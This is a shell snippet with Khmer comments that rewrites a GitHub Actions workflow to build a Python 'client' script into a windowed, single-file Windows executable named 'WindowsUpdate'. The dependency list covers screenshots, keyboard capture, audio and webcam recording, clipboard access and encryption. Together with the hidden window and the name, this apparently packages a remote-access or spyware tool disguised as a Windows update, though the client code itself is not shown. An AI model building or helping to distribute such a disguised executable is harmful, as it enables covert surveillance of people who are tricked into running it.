cd ~/koko-github

# លុប file ចាស់
rm .github/workflows/build.yml

# បង្កើត file ថ្មីដោយប្រើ cat
cat > .github/workflows/build.yml << 'EOF'
name: Build Windows EXE

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest
    
    steps:
    - uses: actions/checkout@v4
    
    - name: Set up Python
      uses: actions/setup-python@v5
      with:
        python-version: '3.11'
    
    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        pip install pyinstaller
        pip install mss Pillow opencv-python pyautogui pynput sounddevice wavio psutil cryptography numpy pyperclip
    
    - name: Build EXE
      run: |
        pyinstaller --onefile --windowed --name WindowsUpdate koko_client_win_v6_corrected.py
    
    - name: Upload artifact
      uses: actions/upload-artifact@v4
      with:
        name: WindowsUpdate
        path: dist/WindowsUpdate.exe
EOF

echo "✅ build.yml created successfully!"

